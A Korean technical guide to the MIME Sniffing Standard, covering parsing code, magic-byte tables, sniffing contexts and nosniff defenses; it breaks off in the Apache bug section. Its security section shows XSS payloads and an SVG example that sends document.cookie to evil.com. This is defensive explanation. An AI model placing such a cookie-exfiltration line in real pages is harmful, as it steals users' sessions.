# MIME Sniffing Standard 상세 가이드

## 목차

1. [개요](#1-개요)
2. [MIME 타입 구조](#2-mime-타입-구조)
3. [MIME 타입 파싱](#3-mime-타입-파싱)
4. [MIME 타입 직렬화](#4-mime-타입-직렬화)
5. [MIME 타입 그룹](#5-mime-타입-그룹)
6. [리소스 타입 결정 알고리즘](#6-리소스-타입-결정-알고리즘)
7. [바이트 패턴 매칭](#7-바이트-패턴-매칭)
8. [Sniffing Context](#8-sniffing-context)
9. [보안 고려사항](#9-보안-고려사항)
10. [Apache Bug 호환성](#10-apache-bug-호환성)
11. [실용 예제](#11-실용-예제)
12. [브라우저별 동작](#12-브라우저별-동작)
13. [참고 자료](#13-참고-자료)

---

## 1. 개요

### MIME 스니핑이란

MIME Sniffing Standard는 WHATWG에서 관리하는 Living Standard로, 웹 브라우저가 리소스의 MIME 타입을 결정하는 알고리즘을 정의한다. 서버가 `Content-Type` 헤더를 통해 제공하는 타입 정보가 없거나 부정확한 경우, 브라우저는 리소스의 실제 바이트를 검사하여 타입을 추론한다. 이 과정을 MIME 스니핑(MIME sniffing) 또는 콘텐츠 타입 스니핑(content type sniffing)이라 한다.

```
[MIME 스니핑의 기본 흐름]

서버 응답 수신
    ↓
Content-Type 헤더 확인
    │
    ├── Content-Type 존재
    │   ↓
    │   supplied type으로 사용
    │   ↓
    │   sniffing context에 따라 검증/오버라이드
    │
    └── Content-Type 없음
        ↓
        리소스 바이트 검사 (magic bytes)
        ↓
        computed type 결정
```

### 왜 MIME 스니핑이 필요한가

1. 서버 설정 오류: 많은 서버가 잘못된 `Content-Type`을 반환
2. Content-Type 누락: 일부 서버가 `Content-Type` 헤더를 생략
3. 레거시 호환성: 오래된 웹 서버의 잘못된 설정과 호환
4. 사용자 경험: 타입이 잘못되어도 리소스를 올바르게 처리

```
[실제 문제 예시]

1. 서버가 JavaScript를 text/plain으로 전송
   Content-Type: text/plain
   실제 내용: function hello() { ... }
   → 스니핑 없으면 스크립트가 실행되지 않음

2. 서버가 이미지에 Content-Type을 누락
   Content-Type: (없음)
   실제 내용: 0x89 0x50 0x4E 0x47 ... (PNG 매직 바이트)
   → 스니핑으로 image/png 감지

3. 서버가 HTML을 application/octet-stream으로 전송
   Content-Type: application/octet-stream
   실제 내용: <html><body>Hello</body></html>
   → 보안 위험! (스니핑이 XSS를 유발할 수 있음)
```

---

## 2. MIME 타입 구조

### 2.1 MIME 타입의 구성 요소

```
MIME 타입 (Media Type) 구조:

type "/" subtype *( ";" parameter )

예시: text/html; charset=utf-8

┌─────────────────────────────────────────────┐
│  type    /   subtype   ;  parameter         │
│  ────       ────────      ─────────         │
│  text   /   html      ;  charset=utf-8      │
│                                             │
│  type: 주 타입 (text, image, audio, etc.)    │
│  subtype: 부 타입 (html, png, mp3, etc.)     │
│  parameter: 추가 매개변수 (key=value)        │
└─────────────────────────────────────────────┘
```

### 2.2 MIME 타입의 주요 속성

| 속성 | 설명 | 예시 |
|------|------|------|
| type | 주 타입 | `text`, `image`, `audio`, `video`, `application`, `font`, `multipart` |
| subtype | 부 타입 | `html`, `json`, `png`, `mp4`, `javascript` |
| essence | type/subtype 조합 | `text/html`, `image/png` |
| parameters | 추가 매개변수 맵 | `charset=utf-8`, `boundary=----` |

### 2.3 MIME 타입 예시

```
[일반적인 MIME 타입]

텍스트:
  text/html                    HTML 문서
  text/plain                   일반 텍스트
  text/css                     CSS 스타일시트
  text/javascript              JavaScript (표준)
  text/xml                     XML 문서

이미지:
  image/png                    PNG 이미지
  image/jpeg                   JPEG 이미지
  image/gif                    GIF 이미지
  image/svg+xml                SVG 이미지
  image/webp                   WebP 이미지
  image/avif                   AVIF 이미지

오디오/비디오:
  audio/mpeg                   MP3 오디오
  audio/ogg                    Ogg 오디오
  audio/wav                    WAV 오디오
  video/mp4                    MP4 비디오
  video/webm                   WebM 비디오

응용 프로그램:
  application/json             JSON 데이터
  application/xml              XML 데이터
  application/pdf              PDF 문서
  application/zip              ZIP 압축 파일
  application/octet-stream     바이너리 데이터 (기본)
  application/javascript       JavaScript (deprecated, text/javascript 사용)

폰트:
  font/woff                    WOFF 폰트
  font/woff2                   WOFF2 폰트
  font/ttf                     TrueType 폰트
  font/otf                     OpenType 폰트

멀티파트:
  multipart/form-data          폼 데이터 (파일 업로드)
  multipart/byteranges         바이트 범위 응답
```

### 2.4 매개변수(Parameters)

```
[MIME 타입 매개변수]

text/html; charset=utf-8
         ╰──────────────── charset 매개변수

multipart/form-data; boundary=----WebKitFormBoundary
                     ╰──────────────────────────── boundary 매개변수

text/plain; charset=iso-8859-1
           ╰──────────────────── charset 매개변수

매개변수 규칙:
- 이름은 대소문자를 구분하지 않음 (charset = Charset = CHARSET)
- 값은 따옴표로 감쌀 수 있음 (charset="utf-8")
- 같은 이름의 매개변수는 하나만 허용
- 알 수 없는 매개변수는 무시됨
```

---

## 3. MIME 타입 파싱

### 3.1 파싱 알고리즘 개요

```
[MIME 타입 파싱 알고리즘]

입력: "text/html; charset=utf-8"

단계 1: 선행 HTTP 공백 제거
         "text/html; charset=utf-8"

단계 2: type 추출 (첫 번째 "/" 이전)
         type = "text"

단계 3: type 유효성 검사
         ├── 빈 문자열이면 실패
         └── HTTP 토큰 코드 포인트가 아닌 문자가 있으면 실패

단계 4: "/" 건너뛰기

단계 5: subtype 추출 (";" 이전까지)
         subtype = "html"

단계 6: 후행 HTTP 공백 제거
         subtype = "html"

단계 7: MIME 타입 레코드 생성
         { type: "text", subtype: "html", parameters: {} }

단계 8: 매개변수 파싱 (반복)
         "charset=utf-8" 파싱
         → parameters: { "charset": "utf-8" }

결과: { type: "text", subtype: "html", parameters: { charset: "utf-8" } }
```

### 3.2 매개변수 파싱 상세

```
[매개변수 파싱 알고리즘]

입력: "; charset=utf-8; boundary=----"

반복:
  1. ";" 건너뛰기
  2. 공백 건너뛰기
  3. 매개변수 이름 추출 ("=" 이전까지)
     name = "charset"
  4. 소문자로 변환
     name = "charset"
  5. "=" 건너뛰기
  6. 값 추출:
     ├── 따옴표로 시작하면 → 따옴표 문자열 파싱
     │   "utf-8" → utf-8
     └── 그 외 → ";" 이전까지 추출
         utf-8
  7. 이미 같은 이름의 매개변수가 있으면 무시 (첫 번째 값 유지)
  8. 매개변수 맵에 추가
     parameters["charset"] = "utf-8"
```

### 3.3 JavaScript에서의 MIME 타입 파싱

```javascript
// 간단한 MIME 타입 파서 구현
function parseMIMEType(input) {
    // 1. 앞뒤 공백 제거
    input = input.trim();

    // 2. type 추출
    const slashIndex = input.indexOf('/');
    if (slashIndex === -1) return null;

    const type = input.substring(0, slashIndex).trim().toLowerCase();
    if (!type) return null;

    // 3. subtype 및 parameters 추출
    const rest = input.substring(slashIndex + 1);
    const semicolonIndex = rest.indexOf(';');

    let subtype, paramString;
    if (semicolonIndex === -1) {
        subtype = rest.trim().toLowerCase();
        paramString = '';
    } else {
        subtype = rest.substring(0, semicolonIndex).trim().toLowerCase();
        paramString = rest.substring(semicolonIndex);
    }

    if (!subtype) return null;

    // 4. 매개변수 파싱
    const parameters = new Map();
    const paramRegex = /;\s*([^=]+)=(?:"([^"]*)"|([^;]*))/g;
    let match;
    while ((match = paramRegex.exec(paramString)) !== null) {
        const name = match[1].trim().toLowerCase();
        const value = match[2] !== undefined ? match[2] : match[3].trim();
        if (!parameters.has(name)) {
            parameters.set(name, value);
        }
    }

    return {
        type,
        subtype,
        essence: `${type}/${subtype}`,
        parameters
    };
}

// 사용 예시
const mime = parseMIMEType('Text/HTML; charset=utf-8; charset=iso-8859-1');
console.log(mime);
// {
//   type: "text",
//   subtype: "html",
//   essence: "text/html",
//   parameters: Map { "charset" => "utf-8" }
//   // 두 번째 charset은 무시됨
// }
```

---

## 4. MIME 타입 직렬화

### 4.1 직렬화 알고리즘

```
[MIME 타입 직렬화 알고리즘]

입력: { type: "text", subtype: "html", parameters: { charset: "utf-8" } }

단계 1: essence 생성
         "text/html"

단계 2: 매개변수 직렬화 (각 매개변수에 대해)
         ";charset=utf-8"

         값에 특수 문자가 포함되면 따옴표 사용:
         ";boundary=\"----boundary----\""

결과: "text/html;charset=utf-8"
```

### 4.2 직렬화 규칙

```javascript
function serializeMIMEType(mimeType) {
    // 1. essence
    let result = `${mimeType.type}/${mimeType.subtype}`;

    // 2. 매개변수
    for (const [name, value] of mimeType.parameters) {
        result += `;${name}=`;

        // 값에 따옴표가 필요한지 확인
        if (value === '' || /[^\x21-\x7E]|[";\\]/.test(value)) {
            // 따옴표로 감싸기
            const escaped = value.replace(/([\\"])/g, '\\$1');
            result += `"${escaped}"`;
        } else {
            result += value;
        }
    }

    return result;
}

// 예시
console.log(serializeMIMEType({
    type: 'text',
    subtype: 'html',
    parameters: new Map([['charset', 'utf-8']])
}));
// "text/html;charset=utf-8"

console.log(serializeMIMEType({
    type: 'multipart',
    subtype: 'form-data',
    parameters: new Map([['boundary', '----=_Part_123']])
}));
// "multipart/form-data;boundary=\"----=_Part_123\""
```

---

## 5. MIME 타입 그룹

MIME Sniffing Standard는 여러 MIME 타입 그룹을 정의한다.

### 5.1 Image MIME Type

```
[이미지 MIME 타입]

image/png
image/jpeg (image/jpg 아님!)
image/gif
image/bmp
image/webp
image/avif
image/svg+xml (XML 기반 → 스크립트 실행 가능, 보안 주의)
image/x-icon (파비콘)
image/vnd.microsoft.icon
```

### 5.2 Audio/Video MIME Type

```
[오디오 MIME 타입]
audio/basic          AU/SND 오디오
audio/aiff           AIFF 오디오
audio/mpeg           MP3 오디오
audio/midi           MIDI 오디오
audio/ogg            Ogg Vorbis 오디오
audio/wav            WAV 오디오
audio/wave           WAV 오디오 (별칭)
audio/webm           WebM 오디오
audio/flac           FLAC 오디오

[비디오 MIME 타입]
video/avi            AVI 비디오
video/mp4            MP4 비디오
video/mpeg           MPEG 비디오
video/ogg            Ogg Theora 비디오
video/webm           WebM 비디오
```

### 5.3 Font MIME Type

```
[폰트 MIME 타입]
font/collection      폰트 컬렉션
font/otf             OpenType 폰트
font/sfnt            SFNT 폰트
font/ttf             TrueType 폰트
font/woff            WOFF 폰트
font/woff2           WOFF2 폰트
```

### 5.4 Archive MIME Type

```
[아카이브 MIME 타입]
application/x-rar-compressed    RAR 압축
application/zip                 ZIP 압축
application/x-gzip              GZIP 압축
```

### 5.5 XML MIME Type

```
[XML MIME 타입 판별 규칙]

type이 "text"이고 subtype이 "xml"로 끝나면 XML
또는 type이 "application"이고 subtype이 "xml"로 끝나면 XML

예시:
text/xml              XML
application/xml       XML
application/xhtml+xml XML (XHTML)
application/rss+xml   XML (RSS)
application/atom+xml  XML (Atom)
image/svg+xml         XML (SVG)
application/mathml+xml XML (MathML)
```

### 5.6 HTML MIME Type

```
[HTML MIME 타입]
text/html
```

### 5.7 Scriptable MIME Type

```
[스크립트 실행 가능한 MIME 타입]

다음 MIME 타입은 스크립트가 실행될 수 있어 보안 주의 필요:
- text/html               (인라인 스크립트)
- application/xhtml+xml   (인라인 스크립트)
- image/svg+xml           (인라인 스크립트!)
- application/xml         (XSLT 등)
- text/xml                (XSLT 등)
- application/pdf         (JavaScript 포함 가능)
```

### 5.8 JavaScript MIME Type

```
[JavaScript MIME 타입]

표준:
text/javascript         ← 공식 MIME 타입 (RFC 4329, WHATWG)

레거시 (여전히 인식됨):
application/javascript
application/ecmascript
application/x-ecmascript
application/x-javascript
text/ecmascript
text/javascript1.0
text/javascript1.1
text/javascript1.2
text/javascript1.3
text/javascript1.4
text/javascript1.5
text/jscript
text/livescript
text/x-ecmascript
text/x-javascript

참고: <script> 요소의 type 속성에서는
"module"도 유효한 JavaScript 타입
```

### 5.9 JSON MIME Type

```
[JSON MIME 타입]
application/json       표준 JSON
text/json              (비표준이지만 인식됨)
*/*+json               subtype이 "+json"으로 끝나는 모든 타입
                       예: application/vnd.api+json
                           application/geo+json
                           application/ld+json
```

### 5.10 ZIP-based MIME Type

```
[ZIP 기반 MIME 타입]
application/zip                     ZIP
application/x-gzip                  GZIP
application/x-rar-compressed        RAR

ZIP 기반 포맷:
application/vnd.openxmlformats-officedocument.*  Office 문서 (docx, xlsx, pptx)
application/epub+zip                EPUB 전자책
application/java-archive            JAR (Java)
application/vnd.android.package-archive  APK (Android)
```

---

## 6. 리소스 타입 결정 알고리즘

### 6.1 전체 알고리즘 흐름

```
[리소스 타입 결정 알고리즘]

입력:
  - supplied type (Content-Type 헤더에서 파싱한 MIME 타입)
  - resource header (HTTP 응답 헤더)
  - resource body (응답 본문의 처음 N 바이트)
  - sniffing context (리소스가 사용되는 맥락)
  - no-sniff flag (X-Content-Type-Options: nosniff)

┌──────────────────────────────────────┐
│      supplied type 존재?             │
├──────────┬───────────────────────────┤
│   YES    │          NO              │
│          │                          │
│  nosniff │   바이트 패턴 매칭으로    │
│  설정?   │   타입 추론              │
│  ┌───┐   │                          │
│  │YES│   │   결과: computed type     │
│  │   │   │                          │
│  │ supplied type                    │
│  │ 그대로 사용                      │
│  │   │   │                          │
│  └───┘   │                          │
│  ┌───┐   │                          │
│  │NO │   │                          │
│  │   │   │                          │
│  │ sniffing context에              │
│  │ 따른 검증/오버라이드             │
│  │   │   │                          │
│  └───┘   │                          │
└──────────┴───────────────────────────┘

결과: computed MIME type
```

### 6.2 상세 알고리즘

```
[단계별 알고리즘]

1. supplied type 확인
   └── Content-Type 헤더 파싱 → supplied MIME type

2. nosniff 확인
   └── X-Content-Type-Options: nosniff 헤더가 있으면
       └── supplied type을 그대로 사용 (스니핑 금지)
       └── 단, 스크립트/스타일 컨텍스트에서는 추가 검증

3. sniffing context에 따른 분기:
   ├── navigation context → HTML/XML/기타 감지
   ├── image context → 이미지 타입 감지
   ├── audio/video context → 미디어 타입 감지
   ├── plugin context → 플러그인 타입 감지
   ├── style context → CSS 감지
   ├── script context → JavaScript 감지
   ├── font context → 폰트 타입 감지
   └── (기타) → 범용 스니핑

4. 바이트 패턴 매칭 수행

5. 결과 반환: computed MIME type
```

### 6.3 Unknown Type 스니핑

supplied type이 없거나 `application/octet-stream`일 때 사용되는 알고리즘이다.

```
[Unknown Type 스니핑 순서]

1. 이미지 타입 패턴 매칭
   └── PNG, JPEG, GIF, BMP, WebP, ICO 등

2. 오디오/비디오 타입 패턴 매칭
   └── MP4, WebM, Ogg, MP3, WAV 등

3. 아카이브 타입 패턴 매칭
   └── ZIP, GZIP, RAR 등

4. 폰트 타입 패턴 매칭
   └── WOFF, WOFF2, TrueType, OpenType 등

5. 텍스트/바이너리 판별
   └── 바이트 값 분석으로 텍스트인지 바이너리인지 결정

6. 기본값
   └── application/octet-stream
```

---

## 7. 바이트 패턴 매칭

### 7.1 매직 바이트(Magic Bytes) 개념

매직 바이트는 파일의 시작 부분에 위치하는 고유한 바이트 시퀀스로, 파일 포맷을 식별하는 데 사용된다.

```
[주요 파일 포맷의 매직 바이트]

이미지:
┌─────────────────────────────────────────────────────────────┐
│ 포맷     │ 매직 바이트 (Hex)           │ 매직 바이트 (ASCII) │
├──────────┼─────────────────────────────┼────────────────────┤
│ PNG      │ 89 50 4E 47 0D 0A 1A 0A    │ .PNG....           │
│ JPEG     │ FF D8 FF                    │ ...                │
│ GIF87a   │ 47 49 46 38 37 61          │ GIF87a             │
│ GIF89a   │ 47 49 46 38 39 61          │ GIF89a             │
│ BMP      │ 42 4D                       │ BM                 │
│ WebP     │ 52 49 46 46 xx xx xx xx    │ RIFF....           │
│          │ 57 45 42 50                │ WEBP               │
│ ICO      │ 00 00 01 00                │ ....               │
│ CUR      │ 00 00 02 00                │ ....               │
│ AVIF     │ xx xx xx xx 66 74 79 70    │ ....ftyp           │
│          │ 61 76 69 66                │ avif               │
└──────────┴─────────────────────────────┴────────────────────┘

오디오/비디오:
┌─────────────────────────────────────────────────────────────┐
│ 포맷     │ 매직 바이트 (Hex)           │ 설명               │
├──────────┼─────────────────────────────┼────────────────────┤
│ MP3      │ 49 44 33                    │ ID3 (ID3 태그)     │
│          │ FF FB/F3/F2                │ (프레임 동기)       │
│ OGG      │ 4F 67 67 53                │ OggS               │
│ WAV      │ 52 49 46 46 xx xx xx xx    │ RIFF....           │
│          │ 57 41 56 45                │ WAVE               │
│ FLAC     │ 66 4C 61 43                │ fLaC               │
│ MIDI     │ 4D 54 68 64                │ MThd               │
│ WebM     │ 1A 45 DF A3                │ (EBML 헤더)        │
│ MP4      │ xx xx xx xx 66 74 79 70    │ ....ftyp           │
│ AVI      │ 52 49 46 46 xx xx xx xx    │ RIFF....           │
│          │ 41 56 49 20                │ AVI.               │
└──────────┴─────────────────────────────┴────────────────────┘

폰트:
┌─────────────────────────────────────────────────────────────┐
│ 포맷     │ 매직 바이트 (Hex)           │ 설명               │
├──────────┼─────────────────────────────┼────────────────────┤
│ WOFF     │ 77 4F 46 46                │ wOFF               │
│ WOFF2    │ 77 4F 46 32                │ wOF2               │
│ TrueType │ 00 01 00 00                │ ....               │
│ OpenType │ 4F 54 54 4F                │ OTTO               │
│ Collection│ 74 74 63 66               │ ttcf               │
└──────────┴─────────────────────────────┴────────────────────┘

아카이브:
┌─────────────────────────────────────────────────────────────┐
│ 포맷     │ 매직 바이트 (Hex)           │ 설명               │
├──────────┼─────────────────────────────┼────────────────────┤
│ ZIP      │ 50 4B 03 04                │ PK..               │
│ GZIP     │ 1F 8B                      │ ..                 │
│ RAR      │ 52 61 72 20 1A 07          │ Rar ..             │
└──────────┴─────────────────────────────┴────────────────────┘

문서:
┌─────────────────────────────────────────────────────────────┐
│ 포맷     │ 매직 바이트 (Hex)           │ 설명               │
├──────────┼─────────────────────────────┼────────────────────┤
│ PDF      │ 25 50 44 46                │ %PDF               │
│ PostScript│ 25 21                      │ %!                 │
└──────────┴─────────────────────────────┴────────────────────┘
```

### 7.2 HTML 스니핑 패턴

```
[HTML 스니핑 바이트 패턴]

다음 바이트 시퀀스 중 하나와 매칭되면 text/html:

1. <!DOCTYPE (대소문자 무시)
   → 바이트: 3C 21 44 4F 43 54 59 50 45
              <  !  D  O  C  T  Y  P  E

2. <html (뒤에 공백 또는 >)
   → 바이트: 3C 68 74 6D 6C (+ 공백/태그 종료)

3. <head (뒤에 공백 또는 >)
   → 바이트: 3C 68 65 61 64

4. <script (뒤에 공백 또는 >)
   → 바이트: 3C 73 63 72 69 70 74

5. <iframe (뒤에 공백 또는 >)
   → 바이트: 3C 69 66 72 61 6D 65

6. <h1 (뒤에 공백 또는 >)
   → 바이트: 3C 68 31

7. <div (뒤에 공백 또는 >)
   → 바이트: 3C 64 69 76

8. <font (뒤에 공백 또는 >)
   → 바이트: 3C 66 6F 6E 74

9. <table (뒤에 공백 또는 >)
   → 바이트: 3C 74 61 62 6C 65

10. <a (뒤에 공백 또는 >)
    → 바이트: 3C 61

11. <style (뒤에 공백 또는 >)
    → 바이트: 3C 73 74 79 6C 65

12. <title (뒤에 공백 또는 >)
    → 바이트: 3C 74 69 74 6C 65

13. <b (뒤에 공백 또는 >)
    → 바이트: 3C 62

14. <body (뒤에 공백 또는 >)
    → 바이트: 3C 62 6F 64 79

15. <br (뒤에 공백 또는 >)
    → 바이트: 3C 62 72

16. <p (뒤에 공백 또는 >)
    → 바이트: 3C 70

17. <!-- (HTML 주석)
    → 바이트: 3C 21 2D 2D
```

### 7.3 텍스트/바이너리 판별

```
[텍스트 vs 바이너리 판별 알고리즘]

리소스의 처음 N 바이트를 검사:

바이너리 데이터로 판별하는 바이트값:
- 0x00 ~ 0x08 (C0 제어 문자)
- 0x0E ~ 0x1A (C0 제어 문자)
- 0x1C ~ 0x1F (C0 제어 문자)
- 0x7F (DEL)

예외 (바이너리가 아닌 것으로 판별):
- 0x09 (탭)
- 0x0A (줄바꿈, LF)
- 0x0C (폼 피드)
- 0x0D (캐리지 리턴, CR)
- 0x1B (ESC)

위의 "바이너리 바이트"가 하나도 없으면 → text/plain
하나라도 있으면 → application/octet-stream
```

### 7.4 JavaScript에서의 매직 바이트 감지

```javascript
// 매직 바이트로 파일 타입 감지
function detectFileType(buffer) {
    const bytes = new Uint8Array(buffer);

    // PNG: 89 50 4E 47 0D 0A 1A 0A
    if (bytes[0] === 0x89 && bytes[1] === 0x50 &&
        bytes[2] === 0x4E && bytes[3] === 0x47 &&
        bytes[4] === 0x0D && bytes[5] === 0x0A &&
        bytes[6] === 0x1A && bytes[7] === 0x0A) {
        return 'image/png';
    }

    // JPEG: FF D8 FF
    if (bytes[0] === 0xFF && bytes[1] === 0xD8 && bytes[2] === 0xFF) {
        return 'image/jpeg';
    }

    // GIF: 47 49 46 38 (GIF8)
    if (bytes[0] === 0x47 && bytes[1] === 0x49 &&
        bytes[2] === 0x46 && bytes[3] === 0x38) {
        return 'image/gif';
    }

    // BMP: 42 4D
    if (bytes[0] === 0x42 && bytes[1] === 0x4D) {
        return 'image/bmp';
    }

    // WebP: RIFF....WEBP
    if (bytes[0] === 0x52 && bytes[1] === 0x49 &&
        bytes[2] === 0x46 && bytes[3] === 0x46 &&
        bytes[8] === 0x57 && bytes[9] === 0x45 &&
        bytes[10] === 0x42 && bytes[11] === 0x50) {
        return 'image/webp';
    }

    // PDF: %PDF
    if (bytes[0] === 0x25 && bytes[1] === 0x50 &&
        bytes[2] === 0x44 && bytes[3] === 0x46) {
        return 'application/pdf';
    }

    // ZIP: PK
    if (bytes[0] === 0x50 && bytes[1] === 0x4B &&
        bytes[2] === 0x03 && bytes[3] === 0x04) {
        return 'application/zip';
    }

    // GZIP: 1F 8B
    if (bytes[0] === 0x1F && bytes[1] === 0x8B) {
        return 'application/x-gzip';
    }

    // WOFF: wOFF
    if (bytes[0] === 0x77 && bytes[1] === 0x4F &&
        bytes[2] === 0x46 && bytes[3] === 0x46) {
        return 'font/woff';
    }

    // WOFF2: wOF2
    if (bytes[0] === 0x77 && bytes[1] === 0x4F &&
        bytes[2] === 0x46 && bytes[3] === 0x32) {
        return 'font/woff2';
    }

    // MP3: ID3
    if (bytes[0] === 0x49 && bytes[1] === 0x44 && bytes[2] === 0x33) {
        return 'audio/mpeg';
    }

    // OGG: OggS
    if (bytes[0] === 0x4F && bytes[1] === 0x67 &&
        bytes[2] === 0x67 && bytes[3] === 0x53) {
        return 'audio/ogg';
    }

    // 텍스트/바이너리 판별
    if (isTextContent(bytes)) {
        return 'text/plain';
    }

    return 'application/octet-stream';
}

function isTextContent(bytes) {
    const binaryBytes = new Set([
        ...range(0x00, 0x08),
        ...range(0x0E, 0x1A),
        ...range(0x1C, 0x1F),
        0x7F
    ]);

    const checkLength = Math.min(bytes.length, 512);
    for (let i = 0; i < checkLength; i++) {
        if (binaryBytes.has(bytes[i])) {
            return false;
        }
    }
    return true;
}

function range(start, end) {
    const result = [];
    for (let i = start; i <= end; i++) {
        result.push(i);
    }
    return result;
}

// 사용 예시
async function checkFileType(file) {
    const buffer = await file.slice(0, 16).arrayBuffer();
    const type = detectFileType(buffer);
    console.log(`파일: ${file.name}, 감지된 타입: ${type}`);
    console.log(`파일이 제공한 타입: ${file.type}`);
    return type;
}
```

---

## 8. Sniffing Context

### 8.1 컨텍스트별 스니핑 동작

MIME 스니핑의 동작은 리소스가 사용되는 컨텍스트에 따라 달라진다.

| 컨텍스트 | 설명 | 스니핑 대상 |
|----------|------|------------|
| navigation | 페이지 내비게이션 | HTML, XML, 이미지, 미디어, PDF 등 |
| image | `<img>`, CSS `background-image` | 이미지 타입만 |
| audio/video | `<audio>`, `<video>` | 오디오/비디오 타입만 |
| plugin | `<embed>`, `<object>` | 플러그인 타입 |
| style | `<link rel="stylesheet">` | CSS |
| script | `<script>` | JavaScript |
| font | `@font-face` | 폰트 타입 |
| text track | `<track>` | WebVTT |
| cache manifest | 매니페스트 | text/cache-manifest |

### 8.2 Navigation Context 스니핑

```
[Navigation Context 스니핑 알고리즘]

1. nosniff가 설정되어 있으면
   └── supplied type 그대로 사용

2. supplied type이 없으면
   └── Unknown Type 스니핑 수행
       (이미지 → 미디어 → 아카이브 → 텍스트/바이너리)

3. supplied type이 있으면:
   ├── text/html → HTML로 처리
   ├── text/plain → 텍스트로 처리 (바이트 검사 후 HTML 아닌지 확인)
   ├── application/octet-stream → Unknown Type 스니핑
   ├── 이미지 타입 → 이미지로 처리
   ├── 미디어 타입 → 미디어로 처리
   └── 기타 → supplied type 그대로 사용
```

### 8.3 Image Context 스니핑

```
[Image Context 스니핑 알고리즘]

1. supplied type이 이미지 MIME 타입이면
   └── supplied type 그대로 사용

2. supplied type이 없거나 이미지가 아니면
   └── 이미지 매직 바이트 패턴 매칭:
       ├── PNG 패턴 → image/png
       ├── JPEG 패턴 → image/jpeg
       ├── GIF 패턴 → image/gif
       ├── BMP 패턴 → image/bmp
       ├── WebP 패턴 → image/webp
       ├── ICO 패턴 → image/x-icon
       └── 매칭 없음 → supplied type 또는 application/octet-stream
```

### 8.4 Script Context 스니핑

```
[Script Context 스니핑]

nosniff가 설정된 경우:
  supplied type이 JavaScript MIME 타입이 아니면 → 스크립트 실행 차단!
  이것이 nosniff의 가장 중요한 보안 기능

nosniff가 없는 경우:
  supplied type이 없거나 비표준이어도
  바이트 패턴이 JavaScript처럼 보이면 실행될 수 있음
```

### 8.5 Style Context 스니핑

```
[Style Context 스니핑]

nosniff가 설정된 경우:
  supplied type이 text/css가 아니면 → 스타일시트 적용 차단!

nosniff가 없는 경우:
  supplied type이 없거나 잘못되어도
  text/css로 처리될 수 있음
```

---

## 9. 보안 고려사항

### 9.1 X-Content-Type-Options: nosniff

```
[nosniff 헤더]

HTTP 응답 헤더:
X-Content-Type-Options: nosniff

효과:
├── 브라우저의 MIME 스니핑을 비활성화
├── supplied type(Content-Type)을 그대로 사용하도록 강제
└── 스크립트/스타일 컨텍스트에서 MIME 타입 불일치 시 차단

보안 이점:
├── XSS 공격 방지 (HTML 스니핑 방지)
├── MIME confusion 공격 방지
└── Content-Type 기반의 정확한 처리 보장
```

```
[nosniff 동작 예시]

시나리오: 악의적인 파일 업로드
  파일 이름: evil.jpg
  파일 내용: <script>alert('XSS')</script>
  Content-Type: image/jpeg

nosniff 없을 때:
  브라우저가 바이트를 검사 → HTML 태그 발견
  → text/html로 스니핑 → 스크립트 실행!!! (XSS)

nosniff 있을 때 (X-Content-Type-Options: nosniff):
  브라우저가 Content-Type: image/jpeg 그대로 사용
  → 이미지로 처리 시도 → 유효하지 않은 이미지 → 에러
  → 스크립트 실행되지 않음 (안전)
```

### 9.2 MIME Confusion 공격

```
[MIME Confusion 공격 시나리오]

1. 공격자가 게시판에 파일 업로드
   - 파일명: document.pdf
   - 실제 내용: <html><script>steal_cookies()</script></html>

2. 서버가 파일을 application/pdf로 제공

3. 브라우저가 MIME 스니핑 수행:
   - 바이트 패턴이 PDF가 아님
   - HTML 태그 발견
   - text/html로 스니핑 → 스크립트 실행!

4. 방어: X-Content-Type-Options: nosniff
   - application/pdf 그대로 처리
   - HTML로 스니핑되지 않음
```

### 9.3 보안 권장사항

```
서버 측 보안 설정:

1. 항상 정확한 Content-Type 설정
   ✓ Content-Type: text/html; charset=utf-8
   ✓ Content-Type: application/json
   ✓ Content-Type: image/png

2. nosniff 헤더 추가
   ✓ X-Content-Type-Options: nosniff

3. 사용자 업로드 파일 검증
   ✓ 서버에서 매직 바이트 확인
   ✓ Content-Type과 실제 내용 일치 확인
   ✓ HTML/JavaScript 내용 포함 여부 확인

4. Content-Disposition 헤더 활용
   ✓ Content-Disposition: attachment; filename="file.pdf"
   (다운로드 강제로 브라우저 렌더링 방지)
```

```javascript
// 서버 측: Express.js 보안 설정 예시
const express = require('express');
const helmet = require('helmet');

const app = express();

// helmet이 X-Content-Type-Options: nosniff를 자동 추가
app.use(helmet());

// 또는 수동 설정
app.use((req, res, next) => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    next();
});

// 파일 업로드 시 MIME 타입 검증
const fileUpload = require('express-fileupload');
const fileType = require('file-type');

app.post('/upload', async (req, res) => {
    const file = req.files.myFile;

    // 매직 바이트로 실제 타입 확인
    const detected = await fileType.fromBuffer(file.data);

    if (!detected || !allowedTypes.includes(detected.mime)) {
        return res.status(400).json({ error: '허용되지 않는 파일 형식입니다.' });
    }

    // Content-Type과 실제 타입 비교
    if (file.mimetype !== detected.mime) {
        console.warn('MIME 타입 불일치:', file.mimetype, '!=', detected.mime);
    }

    // 안전한 Content-Type으로 저장/제공
    // ...
});
```

### 9.4 SVG의 보안 위험

```
[SVG MIME 스니핑의 보안 문제]

SVG (image/svg+xml)는 XML 기반이므로:
- <script> 태그 포함 가능
- JavaScript 실행 가능
- 외부 리소스 로드 가능
- CSS를 통한 데이터 유출 가능

공격 예시:
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    // 쿠키 탈취
    new Image().src = 'https://evil.com/?c=' + document.cookie;
  </script>
</svg>

방어:
├── SVG를 <img>로만 사용 (스크립트 실행 불가)
├── Content-Security-Policy 설정
├── SVG 업로드 시 서버에서 스크립트 태그 제거
└── 별도 도메인에서 SVG 제공 (sandbox)
```

---

## 10. Apache Bug 호환성

### 10.1 Apache Content-Type Bug

Apache 웹 서버의 구버전에서 발생하는 유명한 버그로, `Content-Type` 헤더에 잘못된 값을 설정하는 문제이다.

```
[Apache Bug 설명]

문제:
Apache가 일부 파일에 대해 Content-Type을 잘못 설정:
  Content-Type: text/plain; charset=iso-8859-1

이 헤더가 실제로는:
  - text/html인 파일에 text/plain을 설정
  - 이미지 파일에 text/plain을 설정
  - 기타 바이너리 파일에 text/plain을 설정

원인:
  Apache의 기본 설정에서 인식하지 못하는 확장자의 파일에
  text/plain을 기본값으로 할당
```

### 10.2 Apache Bug 대응

```
[MIME Sniffing Standard의 Apache Bug 대응]

supplied type이 다음인 경우 특별 처리:
  - text/plain
  - text/plain; charset=ISO-8859-1
  - text/plain; charset=iso-8859-1
  - text/plain; charset=UTF-8

